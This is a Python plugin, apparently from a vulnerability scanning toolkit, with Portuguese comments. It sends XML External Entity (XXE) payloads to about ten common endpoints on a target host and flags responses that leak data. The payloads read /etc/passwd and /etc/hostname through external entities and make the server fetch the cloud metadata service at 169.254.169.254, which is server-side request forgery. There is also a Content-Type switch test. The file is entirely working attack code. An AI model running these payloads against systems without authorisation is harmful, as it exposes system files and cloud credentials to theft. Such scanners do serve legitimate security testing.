# plugins/xxe_scanner.py
def run(target, ip, open_ports, banners):
    """
    Scanner XXE (XML External Entity Injection).
    Testa endpoints que aceitam XML para injeção de entidades externas.
    """
    import requests

    endpoints = ["/", "/api/", "/api/v1/", "/upload", "/import", "/parse",
                 "/xmlrpc.php", "/soap", "/wsdl", "/feed"]

    payloads = [
        {
            "nome": "FILE_READ",
            "xml": '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><data>&xxe;</data>',
            "indicador": "root:",
        },
        {
            "nome": "SSRF_VIA_XXE",
            "xml": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><data>&xxe;</data>',
            "indicador": "ami-id",
        },
        {
            "nome": "PARAMETER_ENTITY",
            "xml": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/hostname">%xxe;]><data>test</data>',
            "indicador": "",
        },
    ]
    vulns = []

    for ep in endpoints:
        url = f"http://{target}{ep}"
        for payload in payloads:
            try:
                resp = requests.post(url, data=payload["xml"], timeout=8,
                                     headers={"Content-Type": "application/xml"})
                if resp.status_code == 200:
                    if payload["indicador"] and payload["indicador"] in resp.text:
                        vulns.append({
                            "tipo": "XXE",
                            "subtipo": payload["nome"],
                            "endpoint": ep,
                            "severidade": "CRITICO",
                            "amostra": resp.text[:300],
                        })
                    # Verificar erros XML que indicam parsing (possível XXE cego)
                    elif any(kw in resp.text.lower() for kw in
                             ["xml parsing", "entity", "doctype", "dtd"]):
                        vulns.append({
                            "tipo": "XXE_POSSIVEL",
                            "subtipo": "XML_PARSER_DETECTADO",
                            "endpoint": ep,
                            "severidade": "MEDIO",
                        })
            except Exception:
                continue

        # Testar Content-Type JSON → XML switch
        try:
            resp = requests.post(url, data=payloads[0]["xml"], timeout=5,
                                 headers={"Content-Type": "text/xml"})
            if resp.status_code == 200 and "root:" in resp.text:
                vulns.append({
                    "tipo": "XXE_CONTENT_TYPE_SWITCH",
                    "endpoint": ep,
                    "severidade": "CRITICO",
                    "descricao": "XXE via Content-Type switch (text/xml)",
                })
        except Exception:
            pass

    return {"plugin": "xxe_scanner", "resultados": vulns if vulns else "Nenhum XXE detectado"}
